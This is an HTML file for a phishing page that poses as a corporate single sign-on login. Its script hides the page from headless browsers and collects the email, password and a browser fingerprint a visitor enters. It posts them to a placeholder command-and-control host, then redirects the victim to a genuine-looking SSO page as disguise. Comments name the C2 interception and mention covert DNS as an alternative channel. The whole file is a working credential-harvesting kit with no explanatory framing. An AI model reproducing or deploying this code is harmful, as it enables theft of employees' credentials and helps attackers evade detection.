<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="robots" content="noindex, nofollow"/>
  <title>Secure Login</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" />
  <style>
    body {
      background-color: #f9f9f9;
    }
    .login-container {
      max-width: 400px;
      margin: 100px auto;
      padding: 40px;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 150px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://cdn.example.com/logo/enterprise_sso.svg" alt="Company SSO" />
    </div>
    <form id="loginForm" method="POST" action="/auth">
      <div class="mb-3">
        <label for="email" class="form-label">Corporate Email</label>
        <input type="email" class="form-control" id="email" name="email" required autofocus />
      </div>
      <div class="mb-3">
        <label for="password" class="form-label">Password or Token</label>
        <input type="password" class="form-control" id="password" name="password" required />
      </div>
      <div class="d-grid">
        <button type="submit" class="btn btn-primary">Sign In</button>
      </div>
    </form>
    <p class="text-muted text-center mt-3">Â© 2025 Secure Access Corp</p>
  </div>

  <script>
    // Anti-bot: basic headless detection
    if (navigator.webdriver || !navigator.language || !window.chrome) {
      document.body.innerHTML = ""; // Blank page for bots
    }

    // JS-hook for C2 interception
    document.getElementById('loginForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const creds = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        fingerprint: navigator.userAgent + '_' + screen.width + 'x' + screen.height
      };

      // Send to C2 via POST (can be swapped to covert DNS, JSBeacon, etc.)
      await fetch('https://c2.example.com/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(creds)
      });

      // Redirect to real SSO for disguise
      window.location.href = 'https://sso.real-company.com/login';
    });
  </script>
</body>
</html>
